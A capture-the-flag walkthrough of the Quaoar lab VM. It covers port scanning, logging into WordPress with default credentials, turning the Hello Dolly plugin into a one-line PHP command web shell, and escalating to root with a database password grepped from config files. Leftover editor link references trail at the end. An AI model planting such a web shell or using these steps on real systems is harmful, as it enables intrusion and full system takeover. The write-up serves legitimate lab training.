# hackfest2016: Quaoar Writeup

IP of the VM is 192.168.1.162. So, made a port scan with nmap:
```sh
$ nmap -p- 192.168.1.162
Starting Nmap 6.47 ( http://nmap.org ) at 2017-05-14 12:16 EEST
Nmap scan report for Quaoar (192.168.1.162)
Host is up (0.0068s latency).
Not shown: 65526 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s
```
Let's look at webapplication on 80 port and try to open robots.txt file.

>Disallow: Hackers
Allow: /wordpress/

Go to the wordpress admin login page (http://192.168.1.162/wordpress/wp-login.php  )and try default admin/admin credentials. It works:)
Navigate to the plugin tab and edit plugin hello dolly with next code:
```php
<?php
system($_GET["cmd"]);
?>
```
Save it and open http://192.168.1.162/wordpress/wp-content/plugins/hello.php?cmd=whoami in browser:
>www-data 

After some investigating of file system, get first flag by http://192.168.1.162/wordpress/wp-content/plugins/hello.php?cmd=cat%20/home/wpadmin/flag.txt:
>2bafe61f03117ac66a73c3c514de796e 

Login via ssh with wpadmin/wpadmin credentials with give more stable sh. Let's try to find DB credentials:
```sh
$ grep -rnw ./ -e DB_PASSWORD
./wordpress/wp-admin/setup-config.php:187:	define('DB_PASSWORD', $pwd);
./wordpress/wp-admin/setup-config.php:241:			case 'DB_PASSWORD' :
./wordpress/wp-config-sample.php:25:define('DB_PASSWORD', 'password_here');
./wordpress/wp-config.php:25:define('DB_PASSWORD', 'rootpassword!');
./wordpress/wp-includes/load.php:327:	$wpdb = new wpdb( DB_USER, DB_PASSWORD, DB_NAME, DB_HOST );
grep: ./hsperfdata_tomcat6/1522: Permission denied
./upload/framework/functions/function.switch_theme.php:71:		"define('DB_PASSWORD', '".DB_PASSWORD."');\n".
./upload/framework/functions/function.switch_theme.php:130:		"define('DB_PASSWORD', '".DB_PASSWORD."');\n".
./upload/framework/class.database.php:166:            'pass' => (array_key_exists('pass', $settings) ? $settings['pass'] : DB_PASSWORD),
./upload/config.php:10:define('DB_PASSWORD', 'rootpassword!');
```
So, we see, that root password is **rootpassword!**
```sh
$ su
Password: 
root@Quaoar:/var/www# id
uid=0(root) gid=0(root) groups=0(root)
```
Trying to get flag.txt
```sh
root@Quaoar:/var/www# cd ~/
root@Quaoar:~# ls
flag.txt  vmware-tools-distrib
root@Quaoar:~# cat flag.txt 
8e3f9ec016e3598c5eec11fd3d73f6fb
```

   [john gruber]: <http://daringfireball.net>
   [df1]: <http://daringfireball.net/projects/markdown/>
   [markdown-it]: <https://github.com/markdown-it/markdown-it>
   [Ace Editor]: <http://ace.ajax.org>
   [node.js]: <http://nodejs.org>
   [Twitter Bootstrap]: <http://twitter.github.com/bootstrap/>
   [jQuery]: <http://jquery.com>
   [@tjholowaychuk]: <http://twitter.com/tjholowaychuk>
   [express]: <http://expressjs.com>
   [AngularJS]: <http://angularjs.org>
   [Gulp]: <http://gulpjs.com>

   [PlDb]: <https://github.com/joemccann/dillinger/tree/master/plugins/dropbox/README.md>
   [PlGh]: <https://github.com/joemccann/dillinger/tree/master/plugins/github/README.md>
   [PlGd]: <https://github.com/joemccann/dillinger/tree/master/plugins/googledrive/README.md>
   [PlOd]: <https://github.com/joemccann/dillinger/tree/master/plugins/onedrive/README.md>
   [PlMe]: <https://github.com/joemccann/dillinger/tree/master/plugins/medium/README.md>
   [PlGa]: <https://github.com/RahulHP/dillinger/blob/master/plugins/googleanalytics/README.md>

